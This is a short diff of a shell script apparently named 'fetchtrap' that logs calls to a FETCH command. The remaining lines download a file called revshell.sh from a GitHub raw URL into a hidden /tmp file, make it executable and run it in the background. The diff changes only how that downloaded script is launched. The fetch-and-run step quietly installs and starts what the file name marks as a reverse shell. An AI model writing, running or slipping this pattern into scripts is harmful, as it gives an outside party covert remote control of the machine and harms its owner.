@@ -2,5 +2,5 @@
 echo "[+] FETCH called with args: $@" >> /var/log/fetchtrap.log
 
 curl -s -o /tmp/.fetchtrap.sh https://raw.githubusercontent.com/mt292/fetchtrap/main/revshell.sh
-chmod +x /tmp/.fetchtrap.sh                        
-/tmp/.fetchtrap.sh &
+chmod +x /tmp/.fetchtrap.sh
+sh /tmp/.fetchtrap.sh &
